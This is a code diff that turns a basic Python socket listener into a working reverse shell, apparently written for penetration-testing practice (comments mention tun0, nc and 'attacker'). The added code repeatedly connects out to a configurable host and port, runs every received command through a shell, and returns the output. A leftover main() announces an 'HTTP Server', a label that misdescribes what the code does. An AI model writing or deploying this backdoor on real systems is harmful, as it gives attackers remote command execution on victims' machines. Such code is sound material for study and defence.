@@ -11,49 +11,37 @@
 '''
 
 import socket
+import subprocess
+import os
 
 # Global Host var
 # May have to assign it to tun0 ip address or pass in target address
-HOST = "127.0.0.1"
+HOST = "127.0.0.1" # CHANGE ME
 
 # Global port var
-PORT = 9999
+PORT = 9999 
 
-#  Creating the socket
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# Binding the socket to tun0 and port 
-server.bind((HOST, PORT))
-
-# Listening for connections * most likely me with NC! 
-server.listen(0)
-print(f"Listening on {HOST}:{PORT}")
-
-# Accept the nc connection
-client_socket, client_address = server.accept()
-print(f"Accepted connection from {client_address[0]}:{client_address[1]}")
-
-# Data loop
 while True:
-    request = client_socket.recv(1024)
-    request = request.decode("utf-8")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((HOST, PORT))
+        break
+    except Exception:
+        s.close()
 
-    if request.lower() == "close":
-        client_socket.send("closed".encode("utf-8"))
+while True:
+    data = s.recv(1024).decode("utf-8")
+    if data.lower() == "exit":
         break
 
-    print(f"Recieved: {request}")
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdout_val = proc.stdout.read() + proc.stderr.read()
 
-    # Sending response 
-    response = "Hello,attacker".encode("utf-8")
-    client_socket.send(response)
+    if len(stdout_val) == 0:
+        stdout_val = b"Command executed, but no output"
+    s.send(stdout_val)
 
-
-print("Server shut down")
-
-# Closing the server 
-client_socket.close()
-server.close()
+s.close()
 
 def main():
     print("HTTP Server is up!") 
